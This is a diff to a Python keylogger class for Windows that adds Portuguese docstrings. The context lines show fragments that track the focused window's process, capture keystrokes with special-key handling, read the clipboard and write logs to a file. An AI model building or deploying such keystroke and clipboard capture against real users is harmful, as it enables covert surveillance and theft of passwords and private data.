@@ -10,6 +10,8 @@ TIMER = 60
 
 
 class Keylogger:
+    """Definição da classe, inicializando os atributos necessários"""
+
     def __init__(self):
         self.key_log = {}
         self.current_window = None
@@ -20,6 +22,7 @@ class Keylogger:
         self.clipboard_data = ""
 
     def get_process(self):
+        """Função para obter o processo que o usuário esta em foco"""
         hwnd = windll.user32.GetForegroundWindow()
         pid = c_ulong(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
@@ -41,6 +44,7 @@ class Keylogger:
         self.process_id = process_id
 
     def capture_keys(self, e):
+        """Função para a captura de teclas, além do tratamento de teclas especiais"""
         key_char = ""
 
         if e.name == "ctrl":
@@ -84,6 +88,7 @@ class Keylogger:
             self.key_log[self.current_window]["log"] += key_char
 
     def get_clipboard(self):
+        """Função para obter o que está no CTRL + C (clipboard)"""
         try:
             win32clipboard.OpenClipboard()
 
@@ -107,6 +112,7 @@ class Keylogger:
                 pass
 
     def main(self, duration=30):
+        """Função main, define o processo de coletada dos dados e retorna o **buffer** com os logs"""
         self.key_log = {}
         logs_filename = "logs.txt"
         buffer = []
